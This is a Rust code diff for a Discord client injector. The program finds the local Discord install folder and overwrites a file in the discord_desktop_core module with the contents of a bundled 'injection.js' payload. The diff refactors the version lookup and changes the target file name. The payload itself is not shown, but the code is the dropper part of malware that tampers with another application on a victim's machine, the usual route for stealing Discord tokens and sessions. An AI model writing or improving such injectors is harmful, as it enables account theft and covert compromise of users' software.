@@ -22,37 +22,32 @@ use std::env;
 use std::path::Path;
 
 fn main() {
-    let localappdata = env::var("localappdata").unwrap();
-    let mut discord_path = String::new();
-    discord_path.push_str(localappdata.as_str());
-    discord_path.push_str("\\");
-    discord_path.push_str((format!("Discord\\app-{CURRENT_DISCORD_VERSION}\\modules\\discord_desktop_core-2\\discord_desktop_core")).as_str());
+    let discord_path = get_latest_disc_version();
 
     let path = Path::new(discord_path.as_str());
     let mut file = String::new();
     file.push_str(path.to_str().unwrap());
+    file.push_str("\\modules\\discord_desktop_core-2\\discord_desktop_core"); 
     file.push_str("\\core.asar");
 
     if check_for_file(file.as_str()) {
-        let drop_contents = include_str!("../../injection/injection.js");
+        let drop_contents = include_str!("../injection/injection.js");
         let mut file_to_overwrite = String::new();
         file_to_overwrite.push_str(path.to_str().unwrap());
-        file_to_overwrite.push_str("\\index.js");
+        file_to_overwrite.push_str("\\index.bac.js");
 
         if check_for_file(file_to_overwrite.as_str()) {
             replace_file_contents(file_to_overwrite.as_str(), drop_contents);
         } else {
             std::fs::write(file_to_overwrite, drop_contents).unwrap();
         }
+    } else {
+        println!("what?");
     }
 }
 
-
 fn check_for_file(file: &str) -> bool {
-    if Path::new(file).exists() {
-        return true;
-    }
-    false
+    Path::new(file).exists()
 }
 
 fn replace_file_contents(file: &str, contents: &str) -> bool {
@@ -64,4 +59,20 @@ fn replace_file_contents(file: &str, contents: &str) -> bool {
     false
 }
 
-static CURRENT_DISCORD_VERSION: &str = "1.0.9004";
+fn get_latest_disc_version() -> String {
+    let localappdata = env::var("localappdata").unwrap();
+    let mut path = String::from(localappdata);
+    path.push_str("\\Discord");
+
+    for entry in std::fs::read_dir(path).unwrap() {
+        let entry = entry.unwrap();
+        let path = entry.path();
+        let possible_path = path.into_os_string().into_string().unwrap();
+
+        if possible_path.contains("app-") {
+            return possible_path;
+        }
+    }
+
+    return "Failed".to_string();
+}
